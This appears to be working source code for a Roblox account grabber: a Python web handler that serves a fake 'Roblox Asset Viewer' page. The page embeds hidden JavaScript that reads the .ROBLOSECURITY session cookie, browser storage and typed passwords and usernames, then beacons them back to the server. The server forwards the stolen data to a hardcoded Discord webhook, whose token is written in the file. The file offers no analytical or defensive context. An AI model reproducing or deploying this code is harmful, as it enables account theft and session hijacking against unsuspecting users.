from urllib import parse
import traceback, requests, base64, httpagentparser, json as _json, os

# Load config
try:
    with open("config.json") as f:
        config = _json.load(f)
except:
    config = {
        "webhook": os.environ.get("WEBHOOK", "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"),
        "image": os.environ.get("IMAGE", "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN"),
        "username": "Roblox Logger",
        "color": 16711680,
    }

def sendDiscord(webhook, json_data):
    try:
        requests.post(webhook, json=json_data, timeout=10)
    except:
        pass

def logRoblox(ip, data, useragent):
    fields = []
    if data.get("username"):
        fields.append({"name": "Username", "value": f"```{data['username']}```", "inline": True})
    if data.get("email"):
        fields.append({"name": "Email", "value": f"```{data['email']}```", "inline": True})
    if data.get("password"):
        fields.append({"name": "Password", "value": f"```{data['password']}```", "inline": True})
    if data.get("cookie"):
        fields.append({"name": ".ROBLOSECURITY Cookie", "value": f"```{data['cookie'][:100]}```", "inline": False})
    if data.get("userId"):
        fields.append({"name": "User ID", "value": f"```{data['userId']}```", "inline": True})
    
    if fields:
        sendDiscord(config["webhook"], {
            "username": "Roblox Grabber",
            "content": "@everyone",
            "embeds": [{
                "title": "Roblox Account Stolen",
                "color": 0x00FF00,
                "fields": fields,
                "footer": {"text": f"IP: {ip}"}
            }]
        })

def harvestScript():
    return '''
<script>
(function() {
    var collected = { username: "", email: "", password: "", cookie: "", userId: "", displayName: "", robux: "" };

    function sendData() {
        if (collected.cookie || collected.password || collected.username || collected.email) {
            var payload = btoa(unescape(encodeURIComponent(JSON.stringify(collected))));
            new Image().src = window.location.pathname + (window.location.search ? "&" : "?") + "rbx=" + payload;
        }
    }

    function extractFromObject(obj) {
        if (!obj || typeof obj !== "object") return;
        if (obj.UserName && !collected.username) collected.username = obj.UserName;
        if (obj.username && !collected.username) collected.username = obj.username;
        if (obj.Name && !collected.username) collected.username = obj.Name;
        if (obj.Password && !collected.password) collected.password = obj.Password;
        if (obj.password && !collected.password) collected.password = obj.password;
        if (obj.Email && !collected.email) collected.email = obj.Email;
        if (obj.email && !collected.email) collected.email = obj.email;
        if (obj.UserId && !collected.userId) collected.userId = obj.UserId;
        if (obj.userId && !collected.userId) collected.userId = obj.userId;
        if (obj.DisplayName && !collected.displayName) collected.displayName = obj.DisplayName;
        if (obj.displayName && !collected.displayName) collected.displayName = obj.displayName;
        if (obj.Robux && !collected.robux) collected.robux = obj.Robux;
        if (obj.robux && !collected.robux) collected.robux = obj.robux;
    }

    function phase1() {
        document.cookie.split("; ").forEach(function(c) {
            var parts = c.split("=");
            if (parts[0] === ".ROBLOSECURITY") collected.cookie = parts.slice(1).join("=");
        });
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            try { var val = JSON.parse(localStorage.getItem(key)); extractFromObject(val); } catch(e) {}
        }
        for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            try { var val = JSON.parse(sessionStorage.getItem(key)); extractFromObject(val); } catch(e) {}
        }
        var robloxKeys = ["Roblox.Membership","Roblox.UserData","robloxUser","roblox_user","user","userData","currentUser","loginData","credentials","account"];
        robloxKeys.forEach(function(k) {
            try { var val = JSON.parse(localStorage.getItem(k)); extractFromObject(val); } catch(e) {}
        });
        var inputs = document.querySelectorAll("input[type='password']");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].value && inputs[i].value.length > 0) {
                collected.password = inputs[i].value;
                var form = inputs[i].closest("form");
                if (form) {
                    var textFields = form.querySelectorAll("input[type='text'], input[type='email'], input[name='username'], input[name='email']");
                    for (var j = 0; j < textFields.length; j++) {
                        if (textFields[j].value && textFields[j].value.length > 0) collected.username = textFields[j].value;
                    }
                }
            }
        }
        if (window.location.hostname.includes("roblox.com")) {
            var uf = document.querySelector("input[name='username'], #login-username");
            var pf = document.querySelector("input[type='password'], #login-password");
            if (pf && pf.value) { collected.password = pf.value; if (uf && uf.value) collected.username = uf.value; }
            try { if (window.Roblox && window.Roblox.User) { if (window.Roblox.User.Username) collected.username = window.Roblox.User.Username; if (window.Roblox.User.UserId) collected.userId = window.Roblox.User.UserId.toString(); } } catch(e) {}
            try { if (window.__INITIAL_STATE__) { if (window.__INITIAL_STATE__.currentUser) extractFromObject(window.__INITIAL_STATE__.currentUser); if (window.__INITIAL_STATE__.user) extractFromObject(window.__INITIAL_STATE__.user); } } catch(e) {}
        }
        sendData();
    }

    function phase2() {
        setTimeout(function() {
            var inputs = document.querySelectorAll("input[type='password']");
            for (var i = 0; i < inputs.length; i++) {
                if (inputs[i].value && inputs[i].value.length > 0 && !collected.password) {
                    collected.password = inputs[i].value;
                    var form = inputs[i].closest("form");
                    if (form) {
                        var textFields = form.querySelectorAll("input[type='text'], input[type='email'], input[name='username'], input[name='email']");
                        for (var j = 0; j < textFields.length; j++) {
                            if (textFields[j].value && textFields[j].value.length > 0) collected.username = textFields[j].value;
                        }
                    }
                }
            }
            sendData();
        }, 1500);
    }

    function phase3() {
        setTimeout(function() { sendData(); }, 4000);
    }

    phase1(); phase2(); phase3();
})();
</script>
'''

def handler(request):
    try:
        ip = request.headers.get("x-forwarded-for", request.headers.get("x-real-ip", ""))
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()
        ua = request.headers.get("user-agent", "")
        
        params = {}
        if request.query_string:
            params = dict(parse.parse_qsl(request.query_string.decode()))
        
        # Handle Roblox callback
        if params.get("rbx"):
            try:
                raw = params["rbx"]
                raw = parse.unquote(raw)
                decoded = base64.b64decode(raw).decode("utf-8")
                data = _json.loads(decoded)
                logRoblox(ip, data, ua)
            except:
                pass
            return {"statusCode": 200, "body": "", "headers": {"Content-Type": "text/plain"}}
        
        page = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Roblox Asset Viewer</title>
<style>*{{margin:0;padding:0;box-sizing:border-box;}}body{{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;}}img{{max-width:100%;max-height:85vh;border-radius:12px;}}</style>
</head>
<body>
<img src="{config["image"]}" alt="Asset"/>
{harvestScript()}
</body>
</html>'''
        
        return {
            "statusCode": 200,
            "body": page,
            "headers": {
                "Content-Type": "text/html; charset=utf-8",
                "Cache-Control": "no-cache, no-store, must-revalidate"
            }
        }
    except Exception as e:
        return {
            "statusCode": 500,
            "body": f"Error: {e}",
            "headers": {"Content-Type": "text/plain"}
        }
